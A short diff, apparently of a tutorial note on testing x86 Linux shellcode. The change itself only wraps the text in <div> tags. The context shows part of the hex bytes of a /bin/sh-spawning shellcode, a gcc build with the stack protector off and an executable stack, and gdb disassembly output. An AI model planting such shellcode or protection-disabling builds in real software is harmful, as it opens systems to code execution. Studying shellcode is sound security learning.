@@ -13,7 +13,7 @@ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\x
 put this encoded into c wrapper then compile with gcc 
 
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
-
+<div>
 gdb ./shellcode
 
 (gdb) break *&code
@@ -45,3 +45,4 @@ Dump of assembler code for function code:
    0x0804a071 <+49>:	xchg   ebx,eax
    0x0804a072 <+50>:	mov    eax,DWORD PTR ds:[eax]
 End of assembler dump.
+</div>
